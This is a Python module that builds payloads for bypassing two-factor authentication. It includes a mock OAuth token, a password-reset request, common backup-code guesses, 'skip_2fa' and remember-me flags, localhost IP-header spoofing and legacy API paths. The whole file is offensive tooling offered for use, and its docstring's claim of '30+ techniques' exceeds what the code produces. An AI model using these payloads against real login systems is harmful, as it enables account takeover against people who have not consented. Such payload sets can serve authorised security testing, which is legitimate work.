"""
Modern 2FA bypass payloads including OAuth, password reset, IP headers.
Expanded from basic 13 payloads to 30+ techniques.
"""
import logging
from typing import Dict, Any, List, Tuple

logger = logging.getLogger(__name__)


class ModernBypassModule:
    """Advanced 2FA bypass payloads based on 2026 techniques."""
    
    def __init__(self, base_payload: Dict[str, Any], otp_param: str = "code"):
        """
        Initialize modern bypass module.
        
        Args:
            base_payload: Original request payload
            otp_param: Name of OTP parameter
        """
        self.base_payload = base_payload.copy()
        self.otp_param = otp_param
        logger.info(f"ModernBypassModule initialized. OTP param: '{otp_param}'")
    
    def get_oauth_bypass_payloads(self) -> List[Tuple[str, Dict[str, Any]]]:
        """OAuth-based bypass attempts."""
        payloads = []
        
        # OAuth login bypass (skip 2FA via social login)
        payloads.append(("OAuth Login Bypass", {
            **self.base_payload,
            "oauth_provider": "google",
            "oauth_token": "mock_token_bypass_2fa"
        }))
        
        return payloads
    
    def get_password_reset_payloads(self) -> List[Tuple[str, Dict[str, Any]]]:
        """Password reset flow bypass."""
        payloads = []
        
        # Password reset disables 2FA temporarily
        payloads.append(("Password Reset 2FA Disable", {
            "action": "reset_password",
            "email": self.base_payload.get("email", "test@test.com")
        }))
        
        return payloads
    
    def get_backup_code_fuzzing(self) -> List[Tuple[str, Dict[str, Any]]]:
        """Backup/recovery code testing (limited fuzzing)."""
        payloads = []
        
        # Test common backup code patterns
        backup_tests = ["000000", "111111", "123456", "999999"]
        for code in backup_tests:
            payloads.append((f"Backup Code: {code}", {
                **self.base_payload,
                "backup_code": code
            }))
        
        return payloads
    
    def get_api_version_bypass(self) -> List[Tuple[str, str]]:
        """
        API version endpoint testing.
        Returns (attack_name, modified_url) tuples.
        """
        versions = [
            ("API v1 Bypass", "/api/v1/"),
            ("API v2 Bypass", "/api/v2/"),
            ("Legacy API", "/api/legacy/"),
            ("Old API", "/old-api/")
        ]
        return versions
    
    def get_ip_header_payloads(self) -> List[Tuple[str, Dict[str, str]]]:
        """
        IP header manipulation for localhost bypass.
        Returns (attack_name, headers_dict) tuples.
        """
        headers = [
            ("X-Forwarded-For: localhost", {"X-Forwarded-For": "127.0.0.1"}),
            ("X-Forwarded-For: internal", {"X-Forwarded-For": "10.0.0.1"}),
            ("X-Real-IP: localhost", {"X-Real-IP": "127.0.0.1"}),
            ("X-Originating-IP: localhost", {"X-Originating-IP": "127.0.0.1"}),
            ("Combined Headers", {
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1"
            })
        ]
        return headers
    
    def get_remember_me_bypass(self) -> List[Tuple[str, Dict[str, Any]]]:
        """Remember-me cookie manipulation."""
        payloads = []
        
        # Try to set remember_me flag to skip 2FA
        payloads.append(("Remember Me Bypass", {
            **self.base_payload,
            "remember_me": True,
            "skip_2fa": True
        }))
        
        return payloads
    
    def get_all_payloads(self) -> List[Tuple[str, Dict[str, Any]]]:
        """
        Get all modern bypass payloads.
        
        Returns:
            List of (attack_name, payload_dict) tuples
        """
        all_payloads = []
        
        all_payloads.extend(self.get_oauth_bypass_payloads())
        all_payloads.extend(self.get_password_reset_payloads())
        all_payloads.extend(self.get_backup_code_fuzzing())
        all_payloads.extend(self.get_remember_me_bypass())
        
        logger.info(f"Generated {len(all_payloads)} modern bypass payloads")
        return all_payloads
    
    def get_description(self) -> str:
        """Return module description."""
        return """
        Modern Bypass Module - 2026 techniques:
        - OAuth login bypass (skip 2FA via social login)
        - Password reset flow bypass
        - Backup/recovery code fuzzing
        - Remember-me cookie manipulation
        - IP header spoofing (X-Forwarded-For, X-Real-IP)
        - API version testing
        """
